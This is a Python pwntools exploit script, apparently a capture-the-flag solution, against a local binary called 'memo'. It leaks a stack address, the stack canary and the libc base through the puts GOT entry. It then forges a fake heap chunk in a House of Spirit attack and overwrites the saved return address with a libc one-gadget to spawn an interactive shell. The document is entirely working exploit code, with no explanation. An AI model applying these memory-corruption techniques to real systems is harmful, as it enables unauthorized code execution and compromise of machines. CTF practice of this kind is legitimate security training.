#!/usr/bin/env python
from pwn import *

GOT = 0x601f90

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts=libc.symbols['puts']

context.update(arch="amd64", os='linux', log_level="info")

def alloc(data):
    r.sendlineafter('> ', '1')

    if len(data) < 0x29:
        data += '\n'
    r.sendafter('Data: ', data)

    return

def stackleak():
    r.sendlineafter('> ','2')
    r.recvline()
    return u64(r.recv(6).ljust(8,"\x00"))

def canaryLeak():
    r.sendlineafter('> ', '2')
    r.recvline()
    return u64(r.recv(7).rjust(8, '\x00'))

def gup(data):
    r.sendlineafter('> ', '4')
    if len(data) < 0x30:
        data += '\n'
    r.sendafter('] ', data)

    return

def libcLeak():
    r.sendlineafter('> ', '2')
    r.recvuntil("Data: ")
    return u64(r.recvlines(2)[0].ljust(8,"\x00"))

def free():
    r.sendlineafter('> ', '3')
    return

def pwn():
    # Leak stack address
    alloc("A"*0x1f)
    r.sendafter("] ","yes\x00")
    buf=stackleak()-0x110
    log.info("Stack: 0x{:08x}".format(buf))

    # Leak canary
    alloc("A"*0x28)
    r.sendafter("] ","yes\x00")
#    pid=util.proc.pidof(r)[0]
#    util.proc.wait_for_debugger(pid)
    canary=canaryLeak()
    log.info("Canary: 0x{:08x}".format(canary))
    # Leak libc
    gup('no\x00'.ljust(0x18, '\x00') + p64(GOT))
    libc=libcLeak()
    #print hexdump(libc)
    libc=libcLeak()-puts
    log.info("Libc base: 0x{:08x}".format(libc))
   
    log.info_once("--[[ Triggering House of Spirit condition ]]--")
    fake_chunk  = p64(0x21)
    fake_chunk += p64(0)
    fake_chunk += p64(buf + 0x10)
    fake_chunk += p64(0) 
    fake_chunk += p64(0x1234)

    gup("no\x00".ljust(8,"\x00")+fake_chunk)
    free()
    one_shot=libc+0x41e92
    alloc("kek\x00")
    r.sendafter("] ","no\x00")
    r.recvuntil("Data: ")
    r.send(p64(0)*3 + p64(canary) + p64(0) + p64(one_shot))
    gup('yes\x00')
    r.interactive()
if __name__=="__main__":
    r=process("./memo")
    pwn()
